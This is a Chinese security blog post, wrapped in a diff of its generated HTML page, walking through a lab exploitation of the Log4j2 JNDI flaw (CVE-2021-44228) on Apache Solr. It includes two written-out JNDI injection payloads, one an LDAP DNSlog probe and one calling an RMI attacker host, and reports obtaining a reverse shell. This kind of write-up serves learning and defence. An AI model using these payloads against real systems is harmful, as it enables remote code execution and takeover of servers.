@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="log4j2-rce">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j2">
+<meta property="og:url" content="http://example.com/2023/07/22/Log4j2/index.html">
+<meta property="og:site_name" content="阿卡丽的神秘商店">
+<meta property="og:description" content="log4j2-rce">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/07/22/Log4j2/image-20230717162518541-16900228152491.png">
+<meta property="og:image" content="http://example.com/2023/07/22/Log4j2/image-20230717170824441-16900228285032.png">
+<meta property="og:image" content="http://example.com/2023/07/22/Log4j2/image-20230717171059472-16900228388363.png">
+<meta property="og:image" content="http://example.com/2023/07/22/Log4j2/image-20230717172109298.png">
+<meta property="og:image" content="http://example.com/2023/07/22/Log4j2/image-20230717172214254-16900228584674.png">
+<meta property="og:image" content="http://example.com/2023/07/22/Log4j2/image-20230717172538750.png">
+<meta property="og:image" content="http://example.com/2023/07/22/Log4j2/image-20230718094817851-16900228756395.png">
+<meta property="og:image" content="http://example.com/2023/07/22/Log4j2/image-20230718094950031-16900228920976.png">
+<meta property="og:image" content="http://example.com/2023/07/22/Log4j2/image-20230718100122935-16900229265087.png">
+<meta property="og:image" content="http://example.com/2023/07/22/Log4j2/image-20230718100231234-16900229364008.png">
+<meta property="og:image" content="http://example.com/2023/07/22/Log4j2/image-20230718101744476-16900229430719.png">
+<meta property="article:published_time" content="2023-07-22T10:45:03.000Z">
+<meta property="article:modified_time" content="2023-07-25T08:29:43.112Z">
+<meta property="article:author" content="akali">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/07/22/Log4j2/image-20230717162518541-16900228152491.png">
+
+<link rel="canonical" href="http://example.com/2023/07/22/Log4j2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Log4j2 | 阿卡丽的神秘商店</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">阿卡丽的神秘商店</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">上古时代的宝贝开卖了</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/gjy20001003" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/22/Log4j2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="akali">
+      <meta itemprop="description" content="远赴人间惊鸿宴，一睹人间盛世颜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="阿卡丽的神秘商店">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Log4j2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-07-22 18:45:03" itemprop="dateCreated datePublished" datetime="2023-07-22T18:45:03+08:00">2023-07-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-07-25 16:29:43" itemprop="dateModified" datetime="2023-07-25T16:29:43+08:00">2023-07-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>log4j2-rce</p>
+<span id="more"></span>
+<h1 id="Log4j2"><a href="#Log4j2" class="headerlink" title="Log4j2"></a>Log4j2</h1><h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>CVE-2021-44228</p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache log4j2.x &lt;= 2.14.1</p>
+<p>受影响的组件和应用有spring-boot-strater-log4j2 / Apache Solr / Apache Flink / Apache Druid等</p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Apache Log4j2是一个基于Java的日志记录工具，该日志框架被大量用于业务系统开发，用来记录日志信息。</p>
+<p>Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，攻击者仅仅需要向目标服务器发送精心构造的恶意数据触发Log4j2组件解析缺陷，就可以实现目标服务器任意命令执行，获取目标服务器权限。</p>
+<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><p>Solr 提供了一个管理接口，用于管理 Solr 实例的配置、核心和其他相关功能。这个管理接口是通过 HTTP 请求与 Solr 服务器进行交互的。</p>
+<p>以下是一些常见的 Solr 管理接口操作：</p>
+<ol>
+<li>查询核心信息（Core API）：使用 <code>/admin/cores</code> 端点可以获取有关当前配置的 Solr 核心的信息，包括核心的名称、路径、状态等。</li>
+<li>添加、删除和重加载核心：使用 <code>/admin/cores?action=create</code> 可以创建新的 Solr 核心，使用 <code>/admin/cores?action=unload</code> 可以卸载（删除）现有的核心，使用 <code>/admin/cores?action=reload</code> 可以重新加载核心。</li>
+<li>管理配置（Config API）：使用 <code>/admin/configs</code> 端点可以管理 Solr 的配置文件。可以上传新的配置文件、列出已有的配置文件、删除配置文件等。</li>
+<li>查询系统信息（System API）：使用 <code>/admin/info/system</code> 端点可以获取有关 Solr 服务器的系统信息，如操作系统、Java 版本、内存使用情况等。</li>
+<li>查询集群状态（Collections API）：使用 <code>/admin/collections</code> 端点可以获取有关 Solr 集群的信息，包括集群中的核心、分片、副本等的状态和配置。</li>
+<li>进行索引和搜索操作（Update API）：使用 <code>/update</code> 端点可以进行索引和搜索操作，包括添加、更新和删除文档。</li>
+</ol>
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="/2023/07/22/Log4j2/image-20230717162518541-16900228152491.png" alt="image-20230717162518541"></p>
+<p>看到有apache Solr服务，查询得知也在log4j2影响范围内，尝试验证是否存在log4j2漏洞</p>
+<p>通过core的api接口<br><img src="/2023/07/22/Log4j2/image-20230717170824441-16900228285032.png" alt="image-20230717170824441"></p>
+<p>其中action为可控参数，后台未对前端用户传递的action参数进行校验，导致存在命令执行漏洞。</p>
+<p>构造dnslog payload：<code>$&#123;jndi:ldap://5sga3s.dnslog.cn&#125;</code></p>
+<p><img src="/2023/07/22/Log4j2/image-20230717171059472-16900228388363.png" alt="image-20230717171059472"></p>
+<p>dnslog平台有回显，证明存在该漏洞</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="/2023/07/22/Log4j2/image-20230717172109298.png" alt="image-20230717172109298"></p>
+<p><img src="/2023/07/22/Log4j2/image-20230717172214254-16900228584674.png" alt="image-20230717172214254"></p>
+<p>得到rmi、ldap值为xd3opg，构造payload：<code>$&#123;jndi:rmi://192.168.115.128:1099/xd3opg&#125;</code></p>
+<p><img src="/2023/07/22/Log4j2/image-20230717172538750.png" alt="image-20230717172538750"></p>
+<p>攻击端服务器回显</p>
+<p><img src="/2023/07/22/Log4j2/image-20230718094817851-16900228756395.png" alt="image-20230718094817851"></p>
+<p>获得反弹shell</p>
+<p><img src="/2023/07/22/Log4j2/image-20230718094950031-16900228920976.png" alt="image-20230718094950031"></p>
+<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>在攻击机脚本返回的消息中<br><img src="/2023/07/22/Log4j2/image-20230718100122935-16900229265087.png" alt="image-20230718100122935"></p>
+<p>wireshark追踪tcp流</p>
+<p><img src="/2023/07/22/Log4j2/image-20230718100231234-16900229364008.png" alt="image-20230718100231234"></p>
+<p>可以看到攻击代码，然后调用反弹shell</p>
+<p><img src="/2023/07/22/Log4j2/image-20230718101744476-16900229430719.png" alt="image-20230718101744476"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/" rel="prev" title="JS原型链污染">
+      <i class="fa fa-chevron-left"></i> JS原型链污染
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/25/baby-web/" rel="next" title="baby_web">
+      baby_web <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Log4j2"><span class="nav-number">1.</span> <span class="nav-text">Log4j2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%BC%96%E5%8F%B7"><span class="nav-number">1.0.1.</span> <span class="nav-text">漏洞编号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-number">1.0.2.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.0.3.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="nav-number">1.0.4.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="nav-number">1.0.5.</span> <span class="nav-text">漏洞验证</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.0.5.1.</span> <span class="nav-text">端口扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.0.6.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-number">1.0.7.</span> <span class="nav-text">流量分析</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="akali"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">akali</p>
+  <div class="site-description" itemprop="description">远赴人间惊鸿宴，一睹人间盛世颜</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">118</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">41</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+      <div id="music163player">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1859652717&auto=1&height=66"></iframe>
+        </iframe>
+      </div>
+
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021-08 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">akali</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+
+<!-- 页面点击出现爱心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+
+<!-- 页面点击出现烟花 -->
+
+ <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+ <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+ <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+</body>
+</html>
